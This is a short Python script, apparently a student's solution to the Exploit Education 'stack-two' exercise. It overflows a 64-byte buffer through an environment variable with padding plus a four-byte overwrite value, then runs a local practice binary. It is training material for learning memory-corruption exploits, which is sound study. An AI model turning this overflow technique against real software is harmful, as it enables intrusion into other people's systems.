# Troy Crawford
# 8/11/2021
# Stacktwo - Exploit Excerices
 
from subprocess import Popen, PIPE
import os
 
buffer_len = 64

# Create environment variable "ExploitEducation", set the value of said environment variable with with garbage equal to the size of the buffer.
# Then send the value of the address to which function we wish to go to.
os.environ['ExploitEducation'] = 'x'*buffer_len + '\x0a\x09\x0a\x0d'
p = Popen(["/home/troy/Documents/probsets/stacktwo.c.o"], stdin=PIPE, stdout=PIPE, stderr=PIPE)

output = p.communicate()
print(output)